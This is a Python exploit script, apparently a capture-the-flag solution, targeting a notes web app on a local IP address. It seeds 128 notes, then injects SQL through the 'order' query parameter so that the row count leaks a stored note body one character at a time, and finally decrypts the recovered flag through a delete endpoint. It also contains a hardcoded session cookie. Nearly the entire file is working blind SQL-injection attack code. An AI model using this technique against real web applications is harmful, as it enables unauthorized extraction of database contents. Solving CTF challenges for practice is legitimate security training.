# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
import re
from urllib.parse import quote

# third-party imports
import requests

cookies = {
    'session': '9f4d29b4892c4472af1942a6b28f6a9f.e5b068c473ff1c472e8f3f9b91da7fbee15cdab20817ce00f6d0225364ead134'
}
url = 'http://192.168.200.128:5000'
flag_encrypted = "ENCRYPT:"
s = requests.Session()


def add_note():
    add_note_url = url + '/add_note'
    for limit in range(128):
        s.post(
            add_note_url,
            cookies=cookies,
            data={"body": f"LIMIT{limit}", "title": f"LIMIT{limit}"},
            allow_redirects=False, timeout=10
        )


def make_request(payload):
    try:
        req = url + quote(f'/notes?order={payload}')
        resp = s.get(req, cookies=cookies, timeout=60)
        return resp
    except Exception:
        return make_request(payload)


def guess_flag(c):
    index = len(c) + 1
    payload = f'asc limit 128-(select unicode(substr((select body from notes limit 1), {index}, 1)))--'
    resp = make_request(payload)
    for limit in range(127, 0, -1):
        if f'LIMIT{limit}' in resp.text:
            character = chr(127-limit)
            return character


def decrypt_flag(flag):
    r = s.post(
        f'{url}/delete_note',
        cookies=cookies,       # no cookie will redirect /logout
        data={'uuid': flag},
        allow_redirects=False  # not follow the redirect to get the response
    )
    # print(r.text)
    flag_decrypted = re.search(r'ALLES!{.+}', r.text)
    return flag_decrypted.group()


if __name__ == '__main__':
    add_note()
    while True:
        try:
            flag_encrypted += guess_flag(flag_encrypted)
            print("[*] " + flag_encrypted)
        except TypeError:
            break
    print("[+] Encrypted flag: " + flag_encrypted)
    flag_decrypted = decrypt_flag(flag_encrypted)
    print("\033[1m\033[32m[+] Decrypted flag: " + flag_decrypted + "\033[0m")
